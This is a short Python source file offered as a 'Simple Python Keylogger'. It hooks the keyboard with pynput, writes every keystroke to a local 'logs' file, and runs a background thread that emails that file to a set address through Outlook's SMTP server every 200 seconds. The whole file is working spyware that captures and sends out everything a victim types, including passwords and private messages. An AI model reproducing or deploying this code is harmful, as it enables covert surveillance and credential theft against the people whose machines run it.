from pynput import keyboard
import logging
from smtplib import *
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Timer,Thread
import time
##########################################################################
########################Simple Python Keylogger###########################
##########################################################################
class sendlogs(Thread):
	def sendEmail(self):
		body = "Testing"
		serveur = SMTP("smtp-mail.outlook.com",587)
		serveur.ehlo_or_helo_if_needed()
		serveur.starttls()
		serveur.login(self.email,self.passwd)
		message = MIMEMultipart()
		message.attach(MIMEText(body, "plain"))
		logs = "logs"
		with open(logs,"rb") as attachment:
			part = MIMEBase("application", "octet-stream")
			part.set_payload(attachment.read())
		encoders.encode_base64(part)
		part.add_header(
			"Content-Disposition",
			"attachment; filename=logs",
		)
		message.attach(part)
		text = message.as_string()
		serveur.sendmail(self.email,self.email,text)
	def __init__(self,email,passwd):
		self.email = email
		self.passwd = passwd
		Thread.__init__(self)
	def run(self):
		while True:
			time.sleep(200)
			self.sendEmail()

class keylogger:
	def write(self,text):
		try:
			logging.basicConfig(filename=("logs"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
			logging.info('"{0}"'.format(text))
		except IOError:
			print("failed to open file")
	def pressed(self,key):
		try:
			keypressed = str(key.char)
		except AttributeError:
			if str(key) == 'Key.space':
				keypressed = " "
			if str(key) == 'Key.enter':
				keypressed = "\n"
			else:
				keypressed = " ("+str(key)+") "
		except Exception:
			keypressed = "@"
		finally:
			self.write(keypressed)
	def __init__(self,email,passwd):
		self.email = email
		self.passwd = passwd
		t = sendlogs(self.email,self.passwd)
		t.start()
		with keyboard.Listener(on_press=self.pressed) as listener:
			listener.join()

########MAIN#########
k = keylogger(email,password)

